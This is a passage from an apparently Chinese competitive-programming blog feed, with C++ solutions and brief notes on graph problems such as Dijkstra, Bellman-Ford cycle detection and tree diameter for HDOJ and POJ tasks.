class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"> </div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1001</span>;</div><div class="line"><span class="keyword">bool</span> <span class="built_in">map</span>[N][N];</div><div class="line"><span class="keyword">struct</span> Monster</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> id,def,add;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&gt;(<span class="keyword">const</span> Monster&amp; a) <span class="keyword">const</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> def&gt;a.def;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"><span class="built_in">vector</span>&lt;Monster&gt; mon[N];</div><div class="line">priority_queue&lt;Monster,<span class="built_in">vector</span>&lt;Monster&gt;,greater&lt;Monster&gt; &gt; M;</div><div class="line"><span class="keyword">bool</span> vis[N];</div><div class="line"><span class="keyword">int</span> cnt[N],father[N];</div><div class="line"><span class="keyword">int</span> T,n,m,atk;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> fa)</span></span></div><div class="line">&#123;</div><div class="line">    father[u]=fa;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cnt[u];i++)</div><div class="line">        M.push(mon[u][i]);</div><div class="line">    <span class="keyword">if</span> (cnt[u]) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>[u][i]&amp;&amp;i!=fa) dfs(i,u);</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solve</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (!M.empty()) M.pop();</div><div class="line">    dfs(<span class="number">0</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">while</span> (!M.empty())</div><div class="line">    &#123;</div><div class="line">        Monster tmp=M.top();</div><div class="line">        M.pop();</div><div class="line">        <span class="keyword">if</span> (atk&lt;=tmp.def) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        atk+=tmp.add;</div><div class="line">        <span class="keyword">int</span> &amp;u=tmp.id;</div><div class="line">        <span class="keyword">if</span> (--cnt[u]==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">                <span class="keyword">if</span> (<span class="built_in">map</span>[u][i]&amp;&amp;i!=father[u]) dfs(i,u);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> x,y,z,i;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">        <span class="built_in">memset</span>(<span class="built_in">map</span>,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="built_in">map</span>));</div><div class="line">        <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</div><div class="line">        <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">            <span class="built_in">map</span>[x][y]=<span class="built_in">map</span>[y][x]=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++) mon[i].clear();</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;atk);</div><div class="line">        <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=m;i++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;x,&amp;y,&amp;z);</div><div class="line">            Monster tmp=&#123;x,y,z&#125;;</div><div class="line">            mon[x].push_back(tmp);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">            cnt[i]=mon[i].size();</div><div class="line">        <span class="keyword">if</span> (solve()) <span class="built_in">puts</span>(<span class="string">"Oh yes."</span>);</div><div class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"Good Good Study,Day Day Up."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>B 想到了第一行没想到第二行<br>更没想到第三行！<br>至少我考虑了一下直接 DP 是 O(NM) 于是没写<br>自我感觉不算特别智障</p><p>D 两个条件都想到了。。。<br>但是 tm 把叶子数错了。。。<br>竟然拿 1&lt;&lt;s 跟 n-s 比。。。_(:з」∠)_</p><p>E 没有想到那么机智的做法。。。<br>拿了个单调栈乱搞。。。太弱智了。。。</p><p>F 优化1其实包含于优化2 。。。<br>也是2、3两个都想到了。。。<br>但是感觉既然是随机数据2应该没什么卵用。。。<br>TLE<br>看题解加了以后快了好多突然想到容斥的复杂度是指数级别的。。。<br>就算只扔掉一个数时间也能变成一半。。。</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HHUACM 专题训练 最短最长路</title>
      <url>/blog/2016/04/21/hhutraining1/</url>
      <content type="html"><![CDATA[<p>A  <a href="http://acm.hdu.edu.cn/showproblem.php?pid=2544" target="_blank" rel="noopener">HDOJ-2544</a><br>模板题。不解释了。<br>顺便学习了一下dij+优先队列的姿势。<br>【感觉代码量跟普通dij很接近啊。。。<br>每个点入队一次，复杂度 O(NlogN)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">101</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">10001</span>*<span class="number">2</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">29</span>;</div><div class="line"><span class="keyword">struct</span> edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> go,next,val;</div><div class="line">&#125;;</div><div class="line">edge eg[M];</div><div class="line"><span class="keyword">int</span> last[N],done[N],d[N],pre[N];</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></div><div class="line">&#123;</div><div class="line">eg[++tot].go=y;</div><div class="line">eg[tot].val=z;</div><div class="line">eg[tot].next=last[x];</div><div class="line">last[x]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,m,i,x,y,z;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m),n)</div><div class="line">&#123;</div><div class="line">tot=<span class="number">0</span>;</div><div class="line"><span class="built_in">memset</span>(last,<span class="number">0</span>,<span class="keyword">sizeof</span>(last));</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=m;i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;x,&amp;y,&amp;z);</div><div class="line">add(x,y,z);</div><div class="line">add(y,x,z);</div><div class="line">&#125;</div><div class="line">priority_queue&lt;pii,<span class="built_in">vector</span>&lt;pii&gt;,greater&lt;pii&gt; &gt; q;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=INF;</div><div class="line"><span class="built_in">memset</span>(done,<span class="number">0</span>,<span class="keyword">sizeof</span>(done));</div><div class="line"><span class="built_in">memset</span>(pre,<span class="number">0</span>,<span class="keyword">sizeof</span>(pre));</div><div class="line">d[<span class="number">1</span>]=<span class="number">0</span>;pre[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">q.push(make_pair(<span class="number">0</span>,<span class="number">1</span>));</div><div class="line"><span class="keyword">while</span> (!q.empty())</div><div class="line">&#123;</div><div class="line">pii u=q.top();</div><div class="line">q.pop();</div><div class="line"><span class="keyword">int</span> v=u.second;</div><div class="line"><span class="keyword">if</span> (done[v]) <span class="keyword">continue</span>;</div><div class="line">done[v]=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=last[v];i;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> x=eg[i].go;</div><div class="line"><span class="keyword">if</span> (d[x]&gt;d[v]+eg[i].val)</div><div class="line">&#123;</div><div class="line">d[x]=d[v]+eg[i].val;</div><div class="line">pre[x]=v;</div><div class="line">q.push(make_pair(d[x],x));</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>B  <a href="http://poj.org/problem?id=1860" target="_blank" rel="noopener">POJ-1860</a><br>我放的时候以为是个大水题<br>其实也就是个类似判正环的。。。<br>（赋初值为0的话就保证了每次操作不出现负数）<br>主要是没想到 Bellman-Ford 然后其他的又写不太清楚。。。<br>后来查了一下还是写 Bellman-Ford 比较简洁：O(NM)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">101</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">101</span>*<span class="number">2</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">29</span>;</div><div class="line"><span class="keyword">struct</span> edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> st,ed;</div><div class="line"><span class="keyword">double</span> c,r;</div><div class="line">&#125;;</div><div class="line">edge eg[M];</div><div class="line"><span class="keyword">double</span> d[N];</div><div class="line"><span class="keyword">int</span> n,m,tot;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">double</span> r,<span class="keyword">double</span> c)</span></span></div><div class="line">&#123;</div><div class="line">eg[++tot].st=x;</div><div class="line">eg[tot].ed=y;</div><div class="line">eg[tot].r=r;</div><div class="line">eg[tot].c=c;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Bellman_Ford</span><span class="params">(<span class="keyword">int</span> s,<span class="keyword">double</span> val)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> i,j;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=<span class="number">0</span>;</div><div class="line">d[s]=val;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=tot;j++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> u=eg[j].st,v=eg[j].ed;</div><div class="line"><span class="keyword">if</span> (d[v]&lt;(d[u]-eg[j].c)*eg[j].r)</div><div class="line">&#123;</div><div class="line">f=<span class="number">1</span>;</div><div class="line">d[v]=(d[u]-eg[j].c)*eg[j].r;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (f==<span class="number">0</span>) <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (d[s]&gt;val) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"><span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=tot;j++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> u=eg[j].st,v=eg[j].ed;</div><div class="line"><span class="keyword">if</span> (d[v]&lt;(d[u]-eg[j].c)*eg[j].r)</div><div class="line"><span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> i,x,y,s;</div><div class="line"><span class="keyword">double</span> val,r,c;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d%d%lf"</span>,&amp;n,&amp;m,&amp;s,&amp;val);</div><div class="line">tot=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=m;i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;r,&amp;c);</div><div class="line">add(x,y,r,c);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;r,&amp;c);</div><div class="line">add(y,x,r,c);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (Bellman_Ford(s,val)) <span class="built_in">puts</span>(<span class="string">"YES"</span>);</div><div class="line"><span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"NO"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>C  <a href="http://acm.hdu.edu.cn/showproblem.php?pid=4514" target="_blank" rel="noopener">HDOJ-4514</a><br>我竟然会有一天因为读入忘记加  !=EOF  TLE七次<br><img src="https://img-blog.csdn.net/20160414220121569" alt=""><br>看了看网上的题解  基本都是并查集+DP。<br>其实没有必要。。。<br>无向图判环最基本的方法就是DFS。。。<br>其次  不成环的话就是森林<br>每棵树用两次BFS求直径的方法<br>也就是说这题是DFS+BFS。。。<br>这样就完全不会有空间的问题<br>不过我也不知道出题人的本意是哪个。。。<br>判环时每个点遍历一次，求长度时每个点遍历两次，复杂度 O(N)<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;iostream&gt;</span></div><div class="line"><span class="comment">#include &lt;cstdio&gt;</span></div><div class="line"><span class="comment">#include &lt;cstring&gt;</span></div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">100001</span>;</div><div class="line">const <span class="keyword">int</span> M=<span class="number">1000001</span>*<span class="number">2</span>;</div><div class="line">const <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">29</span>;</div><div class="line">struct edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> go,<span class="keyword">next</span>,val;</div><div class="line">&#125;;</div><div class="line">edge eg[M];</div><div class="line"><span class="keyword">int</span> <span class="keyword">last</span>[N],vis[N],d[N],<span class="string">q[N]</span>;</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"></div><div class="line">void add(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>,<span class="keyword">int</span> z)</div><div class="line">&#123;</div><div class="line">eg[++tot].go=<span class="keyword">y</span>;</div><div class="line">eg[tot].val=z;</div><div class="line">eg[tot].next=<span class="keyword">last</span>[<span class="keyword">x</span>];</div><div class="line"><span class="keyword">last</span>[<span class="keyword">x</span>]=tot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">bool circle(<span class="keyword">int</span> u,<span class="keyword">int</span> pre)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> i,ans=<span class="number">0</span>;</div><div class="line">vis[u]=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> ((i^pre)!=<span class="number">1</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (vis[eg[i].go]) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">ans|=circle(eg[i].go,i);</div><div class="line"><span class="keyword">if</span> (ans==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void bfs(<span class="keyword">int</span> <span class="keyword">s</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> l=<span class="number">0</span>,r=<span class="number">1</span>,i;</div><div class="line"><span class="string">q[1]</span>=<span class="keyword">s</span>;d[<span class="keyword">s</span>]=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (l&lt;r)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> u=<span class="string">q[++l]</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> v=eg[i].go;</div><div class="line"><span class="keyword">if</span> (d[v]==-<span class="number">1</span>)</div><div class="line">&#123;</div><div class="line"><span class="string">q[++r]</span>=v;</div><div class="line">d[v]=eg[i].val+d[u];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> n,<span class="keyword">m</span>,i,j,<span class="keyword">x</span>,<span class="keyword">y</span>,z;</div><div class="line"><span class="keyword">while</span> (scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;<span class="keyword">m</span>)!=EOF)</div><div class="line">&#123;</div><div class="line">tot=-<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) <span class="keyword">last</span>[i]=-<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=<span class="keyword">m</span>;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d%d%d"</span>,&amp;<span class="keyword">x</span>,&amp;<span class="keyword">y</span>,&amp;z);</div><div class="line">add(<span class="keyword">x</span>,<span class="keyword">y</span>,z);</div><div class="line">add(<span class="keyword">y</span>,<span class="keyword">x</span>,z);</div><div class="line">&#125;</div><div class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (!vis[i])</div><div class="line"><span class="keyword">if</span> (circle(i,-<span class="number">1</span>)) <span class="keyword">break</span>;</div><div class="line"><span class="keyword">if</span> (i&lt;=n) puts(<span class="string">"YES"</span>);</div><div class="line"><span class="keyword">else</span> </div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> ans=-<span class="number">1</span>,p;</div><div class="line">memset(vis,<span class="number">0</span>,sizeof(vis));</div><div class="line"><span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=n;j++)</div><div class="line"><span class="keyword">if</span> (!vis[j])</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=-<span class="number">1</span>;</div><div class="line">bfs(j); p=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (d[i]&gt;d[p]) p=i;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++) d[i]=-<span class="number">1</span>;</div><div class="line">bfs(p); p=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (d[i]!=-<span class="number">1</span>) vis[i]=<span class="number">1</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line"><span class="keyword">if</span> (d[i]&gt;d[p]) p=i;</div><div class="line"><span class="keyword">if</span> (d[p]&gt;ans) ans=d[p];</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>D  <a href="http://acm.hdu.edu.cn/showproblem.php?pid=2196" target="_blank" rel="noopener">HDOJ-2196</a><br>【准确的说跟上一题知识点有重叠。。。<br>很明显题目里给的是一棵树<br>可以证明，到 u 最远距离的 v 一定是直径的一端。<br>假设有 v’ 使得 u-v’ 距离更长，<br>1、u 在直径上：记直径另一端为 s ，显然有 s-&gt;u-&gt;v’ 比 s-&gt;u-&gt;v 长，这与 v 为直径一端矛盾。<br>2、u 不在直径上：记直径另一端为 s ，<br>    以 u 为根，v’ 不能在 u-&gt;s 和 u-&gt;v 上。<br>    则 (u-&gt;v’) + (u-&gt;s) 大于 (u-&gt;v) + (u-&gt;s) 大于等于 (v-&gt;s) ，矛盾。</p><p>于是只需要求直径两端到各个点的距离。<br>每个点被遍历三次，复杂度 O(N)<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;iostream&gt;</span></div><div class="line"><span class="comment">#include &lt;cstdio&gt;</span></div><div class="line"><span class="comment">#include &lt;cstring&gt;</span></div><div class="line"><span class="comment">#include &lt;algorithm&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">10001</span>;</div><div class="line">const <span class="keyword">int</span> M=<span class="number">10001</span>*<span class="number">2</span>;</div><div class="line">const <span class="keyword">int</span> INF=<span class="number">1</span>&lt;&lt;<span class="number">29</span>;</div><div class="line">struct edge</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> go,<span class="keyword">next</span>,val;</div><div class="line">&#125;;</div><div class="line">edge eg[M];</div><div 